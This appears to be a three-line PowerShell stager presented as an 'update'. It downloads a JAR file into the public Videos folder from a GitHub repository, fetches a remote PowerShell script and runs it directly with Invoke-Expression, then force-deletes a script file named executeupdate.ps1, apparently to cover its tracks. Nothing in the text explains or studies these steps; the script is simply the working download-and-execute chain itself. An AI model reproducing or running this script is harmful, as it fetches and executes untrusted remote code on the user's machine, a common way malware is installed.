Invoke-WebRequest https://github.com/RaupenInspektor/Updates/raw/main/executeupdate.jar -OutFile C:\Users\Public\Videos\executeupdate.jar -UseBasicParsing
Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/Updates/raw/main/move.ps1" -UseBasicParsing).Content

Remove-Item -Path C:\Users\Public\videos\executeupdate.ps1 -Force
